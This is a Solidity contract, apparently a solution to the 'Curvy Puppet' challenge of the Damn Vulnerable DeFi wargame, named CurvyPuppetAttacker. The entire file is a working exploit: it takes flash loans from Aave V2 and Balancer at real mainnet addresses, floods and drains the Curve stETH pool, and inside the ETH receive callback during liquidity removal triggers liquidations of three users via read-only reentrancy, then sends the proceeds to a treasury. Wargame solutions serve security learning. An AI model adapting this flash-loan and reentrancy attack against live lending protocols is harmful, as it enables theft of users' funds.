// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IPermit2} from "permit2/interfaces/IPermit2.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLending.sol";
import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract CurvyPuppetAttacker is IFlashLoanRecipient, IFlashLoanReceiver {
    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IStableSwap constant curvePool = IStableSwap(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 constant stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    WETH constant weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    IVault constant balancer_vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ILendingPool constant aaveV2Pool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address constant aSTETH = 0x1982b2F5814301d4e9a8b0201555376e62F82428;

    DamnValuableToken dvt;
    CurvyPuppetLending lending;
    CurvyPuppetOracle oracle;

    address public user1;
    address public user2;
    address public user3;
    address public treasury;
    bool public isRemovingLiquidity;

    constructor(
        address _treasury,
        address _user1,
        address _user2,
        address _user3,
        DamnValuableToken _dvt,
        CurvyPuppetLending _lending,
        CurvyPuppetOracle _oracle
    ) payable {
        treasury = _treasury;
        user1 = _user1;
        user2 = _user2;
        user3 = _user3;
        dvt = _dvt;
        lending = _lending;
        oracle = _oracle;

        IERC20(lending.borrowAsset()).approve(address(permit2), type(uint256).max);
        permit2.approve({
            token: lending.borrowAsset(),
            spender: address(lending),
            amount: uint160(1e18 * 3),
            expiration: uint48(block.timestamp + 1 hours)
        });
    }

    function run() external {
        _flashloanOnAaveV2();
        _returnAsset();
    }

    function _flashloanOnAaveV2() private {
        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        uint256 stETHBorrowAmount = IERC20(address(stETH)).balanceOf(aSTETH);
        uint256 ethBorrowAmount = 15000e18;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = stETHBorrowAmount;
        amounts[1] = ethBorrowAmount;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        aaveV2Pool.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        uint256 stEthBorrowedAave = amounts[0];
        uint256 ethBorrowedAave = amounts[1];
        uint256 feestETH = premiums[0];
        uint256 feeETH = premiums[1];

        uint256 stETHTotalPayback = stEthBorrowedAave + feestETH;
        _flashloanOnBalancer(stETHTotalPayback);

        IERC20(address(stETH)).approve(address(aaveV2Pool), stETHTotalPayback);
        IERC20(address(weth)).approve(address(aaveV2Pool), ethBorrowedAave + feeETH);
        return true;
    }

    function _flashloanOnBalancer(uint256 stETHTotalPayback) private {
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(weth));
        uint256 amount = IERC20(address(weth)).balanceOf(address(balancer_vault));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        bytes memory userData = abi.encode(stETHTotalPayback);
        balancer_vault.flashLoan(this, tokens, amounts, userData);
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) external {
        uint256 stETHTotalPayback = abi.decode(userData, (uint256));
        uint256 wethBorrowedFromBalancer = amounts[0];

        uint256 WethBorrowedTotal = IERC20(address(weth)).balanceOf(address(this));
        weth.withdraw(WethBorrowedTotal);

        uint256 ethToAdd = address(this).balance;
        uint256 stEthToAdd = IERC20(stETH).balanceOf(address(this));
        _attack(ethToAdd, stEthToAdd, stETHTotalPayback);

        IERC20(address(weth)).transfer(msg.sender, wethBorrowedFromBalancer);
    }

    function _attack(uint256 amount0, uint256 amount1, uint256 stETHTotalPayback) private {
        _addLiquidity(amount0, amount1);
        uint256 lP_Token_burn = IERC20(curvePool.lp_token()).balanceOf(address(this)) - 31e17;
        _removeLiquidity(lP_Token_burn);
        _payFlashloan(stETHTotalPayback);
    }

    function _payFlashloan(uint256 stETHTotalPayback) private {
        uint256 balancestETH = IERC20(address(stETH)).balanceOf(address(this));
        uint256 stEthToExchange = stETHTotalPayback - balancestETH;
        uint256 testETHAmount = 13975e18;
        _exchangeETHToStETH(testETHAmount);
        uint256 ethBalanceLeft = address(this).balance;
        weth.deposit{value: ethBalanceLeft}();
    }

    function _exchangeETHToStETH(uint256 amount) private {
        curvePool.exchange{value: amount}(0, 1, amount, 0);
    }

    function _addLiquidity(uint256 amount0, uint256 amount1) private {
        IERC20(address(stETH)).approve(address(curvePool), amount1);
        uint256[2] memory amounts;
        amounts[0] = amount0;
        amounts[1] = amount1;
        curvePool.add_liquidity{value: amount0}(amounts, 0);
    }

    function _removeLiquidity(uint256 amount) private {
        isRemovingLiquidity = true;
        curvePool.remove_liquidity(amount, [uint256(0), 0]);
        isRemovingLiquidity = false;
    }

    receive() external payable {
        if (isRemovingLiquidity) {
            lending.liquidate(user1);
            lending.liquidate(user2);
            lending.liquidate(user3);
        }
    }

    function _returnAsset() private {
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        IERC20(curvePool.lp_token()).transfer(treasury, IERC20(curvePool.lp_token()).balanceOf(address(this)));
        weth.deposit{value: address(this).balance}();
        weth.transfer(treasury, weth.balanceOf(address(this)));
    }
}
